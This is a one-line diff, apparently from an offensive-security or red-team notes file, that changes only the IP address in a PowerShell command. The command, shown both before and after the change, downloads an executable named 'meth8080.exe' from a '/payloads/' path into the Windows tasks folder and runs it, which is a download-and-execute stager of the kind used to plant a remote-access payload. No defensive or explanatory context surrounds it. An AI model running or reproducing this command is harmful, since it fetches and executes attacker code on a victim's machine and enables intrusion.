@@ -1,1 +1,1 @@
-powershell -c "iwr -Uri 'http://10.2.2.153/payloads/meth8080.exe' -OutFile 'c:\windows\tasks\meth8080.exe' -TimeoutSec 300; c:\windows\tasks\meth8080.exe"
+powershell -c "iwr -Uri 'http://10.0.0.1/payloads/meth8080.exe' -OutFile 'c:\windows\tasks\meth8080.exe' -TimeoutSec 300; c:\windows\tasks\meth8080.exe"
